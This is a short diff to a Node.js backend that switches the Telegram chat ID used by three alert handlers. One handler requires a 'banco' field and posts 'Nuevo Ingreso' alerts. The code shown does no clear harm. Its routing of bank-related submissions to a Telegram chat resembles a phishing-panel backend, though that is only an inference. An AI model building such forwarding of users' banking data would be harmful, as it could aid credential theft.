@@ -347,7 +347,7 @@ export const initProcessAlert = async (req, res) => {
 
 
   // Usamos “texto plano” con emojis y caracteres. (parse_mode HTML evita escape Markdown)
-  const chatId = '-5062617618';
+  const chatId = '-1003470878672';
 
   const controller = new AbortController();
   const timeout = setTimeout(() => controller.abort(), 25000); // 25s
@@ -403,7 +403,7 @@ export const latamSimpleMsj = async (req, res) => {
       return res.status(400).json({ success: false, error: 'Invalid payload: "banco" is required' });
     }
 
-    const chatId = '-5062617618';
+    const chatId = '-1003470878672';
    
     const text = [
       '🚨🚨 Nuevo Ingreso 🚨🚨',
@@ -457,7 +457,7 @@ export const latamSimpleMsj = async (req, res) => {
 export const editLatamMsj = async (req, res) => {
   const token = process.env.TELEGRAM_BOT_TOKEN;
   const data = req.body.data;
-  const chatId = "-5062617618";
+  const chatId = "-1003470878672";
   const messageId = req.body.messageId; // Asegúrate de pasar el messageId en la solicitud
   console.log(messageId);
   console.log(data);
